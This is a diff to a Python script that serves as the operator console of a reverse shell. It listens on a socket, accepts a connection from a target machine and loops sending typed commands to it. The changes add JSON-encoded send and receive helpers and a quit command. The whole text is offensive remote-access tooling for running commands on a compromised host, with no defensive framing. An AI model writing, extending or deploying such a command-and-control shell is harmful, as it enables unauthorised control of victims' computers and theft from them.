@@ -1,16 +1,33 @@
 #!/usr/bin/python
 
+import sys
+import json
 import socket
 from termcolor import colored
-import sys
+
+
+def s_send(data):
+    json_data = json.dumps(data)
+    target.send(json_data.encode("utf-8"))
+
+def s_recv():
+    data = ""
+    while True:
+        try:
+            data = data + target.recv(1024).decode("utf-8")
+            return json.loads(data)
+        except ValueError:
+            continue
 
 def shell():
     while True:
         command = input("Shell@{}~".format(ip[0]))
-        target.send(command.encode("utf-8"))
-        message = target.recv(1024)
-        print(message.decode("utf-8"))
-
+        s_send(command)
+        if command == "q":
+            break
+        else:
+            result = s_recv()
+            print(result)
 
 def server ():
     global s
@@ -24,7 +41,8 @@ def server ():
     target, ip = s.accept()
     print(colored("[+] Connection Established From : {}".format(ip), "green"))
     
-
 server()
 shell()
 s.close()
+print(colored("Closing connection !!!", "red"))
+sys.exit()
